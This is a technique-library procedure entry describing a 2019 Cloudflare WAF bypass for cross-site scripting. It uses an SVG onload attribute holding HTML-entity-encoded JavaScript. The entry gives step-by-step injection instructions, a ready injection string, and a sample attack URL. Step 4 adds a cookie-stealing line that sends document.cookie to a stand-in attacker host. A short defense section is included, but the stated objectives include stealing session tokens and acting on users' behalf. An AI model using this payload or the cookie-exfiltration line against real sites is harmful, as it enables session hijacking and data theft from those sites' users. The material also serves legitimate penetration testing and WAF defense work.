---
id: 4c52b305-ecbf-4fca-9060-045ba0db71f6
name: Cloudflare-XSS-Bypass-Using-SVG-Onload
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:43.413656+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[Execution]]'
techniques:
  - '[[JavaScript]]'
sub_techniques: []
tags:
  - xss
  - cloudflare-bypass
  - waf-bypass
  - svg-onload
  - '[[tags/Cloudflare XSS Bypass - 22nd March 2019 (by @RakeshMane10)]]'
  - '[[tags/Common WAF Bypass]]'
  - '[[tags/Cross Site Scripting]]'
commands: []
platforms:
  - Web
tools: []
validated: true
---

# Cloudflare-XSS-Bypass-Using-SVG-Onload

## Summary

This procedure demonstrates a technique to bypass Cloudflare's XSS protection using an SVG element with an onload attribute containing encoded JavaScript. Discovered on March 22nd, 2019 by @RakeshMane10, it allows injection of malicious code into vulnerable web applications protected by Cloudflare, enabling execution of JavaScript without triggering WAF rules. The payload uses HTML entity encoding to obfuscate the script, such as an alert, and can be adapted to steal sensitive data or perform unauthorized actions.

## Description

The SVG onload bypass exploits the ability to embed executable JavaScript within an SVG image tag's onload event, which Cloudflare's filters at the time failed to detect properly. When injected into a user-controlled input field (e.g., a search box, comment form, or profile field) that renders HTML/SVG without proper sanitization, the browser loads the SVG and triggers the onload script. The JavaScript is obfuscated using HTML decimal entities (e.g., &#97; for 'a') to evade signature-based detection. This technique targets reflected or stored XSS vulnerabilities in web applications behind Cloudflare. Successful execution can lead to session hijacking, data theft (e.g., cookies, tokens), or further exploitation like keylogging. It requires a vulnerable input point and does not rely on external tools, making it suitable for manual testing or low-privilege attacks. Note that modern Cloudflare updates may mitigate this; always verify in the target environment.

## Requirements

1. Access to a web application with a vulnerable input field that accepts and renders user input as HTML/SVG (e.g., via reflected/stored XSS).
2. Knowledge of HTML entity encoding for JavaScript obfuscation.
3. A testing environment or proxy tool like Burp Suite to intercept and modify requests (optional but recommended for verification).
4. Target must be protected by an older version of Cloudflare vulnerable to this bypass (pre-2019 updates).

## Defense

Defensive measures and detection strategies:

- Implement Content Security Policy (CSP) with strict script-src directives to block inline JavaScript execution.
- Sanitize all user inputs using libraries like DOMPurify, stripping or escaping SVG tags and onload attributes.
- Deploy a modern WAF with behavioral analysis to detect anomalous JavaScript execution in SVG contexts.
- Enable browser security features like XSS Auditor (deprecated in modern browsers) or use strict output encoding (e.g., htmlspecialchars in PHP).
- Monitor for unusual JavaScript events or entity-decoded payloads in logs; use SIEM rules to alert on SVG onload patterns.
- Regularly update Cloudflare rulesets and perform penetration testing to identify bypasses.

## Objectives

1. Inject an obfuscated SVG onload payload into a vulnerable web input to bypass Cloudflare WAF.
2. Execute arbitrary JavaScript in the victim's browser without detection.
3. Steal sensitive information such as cookies, session tokens, or form data.
4. Perform unauthorized actions on behalf of the user, such as account modification or data exfiltration.
5. Demonstrate the vulnerability for reporting or educational purposes.

## Instructions

### Step 1: Identify Vulnerable Input Point

**Context**: Locate a user-controlled input field in the target application that reflects or stores input without proper sanitization, allowing SVG rendering. Common vectors include search bars, user profiles, or comment sections protected by Cloudflare.

Test for basic XSS by injecting a simple payload like <script>alert(1)</script> and observe if it's blocked. If blocked, proceed to SVG bypass.

### Step 2: Prepare Obfuscated Payload

**Context**: Obfuscate the JavaScript to evade detection. Use HTML decimal entities to encode the script (e.g., alert(1)// becomes &#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#x2f;&#x2f;). This step ensures the payload doesn't match Cloudflare's string signatures.

Use an online HTML entity encoder or manually convert characters (e.g., a=97, l=108, e=101, r=114, t=116, (=40, 1=49, )=41, /=2f). For this procedure, use the provided [[codes/SVG-Onload-Alert-Payload]] code snippet.

### Step 3: Inject the SVG Payload

**Context**: Submit the obfuscated payload wrapped in an SVG tag to the vulnerable input. The onload attribute triggers the encoded JavaScript upon rendering.

Construct the injection as: <svg onload="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#x2f;&#x2f;">. Submit via the input form (e.g., GET/POST request). If using a proxy, intercept and modify the request body or query parameters.

For example, in a search form: https://target.com/search?q=<svg%20onload=%22&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#x2f;&#x2f;%22>

### Step 4: Verify Execution

**Context**: Confirm the bypass by observing if the alert pops up without Cloudflare blocking the request. Check browser console for errors or network tab for unobstructed responses.

If successful, replace alert(1) with a real payload, such as document.location='http://attacker.com/steal?cookie='+document.cookie, re-encoded similarly.

**Expected Output**: A JavaScript alert box displays "1" (or the decoded payload executes). No 403/Cloudflare block page; the response renders the SVG without stripping.

**Success Indicators**:
- Alert executes in the browser.
- No WAF challenge or block observed in request/response.
- Encoded payload decodes and runs without syntax errors.
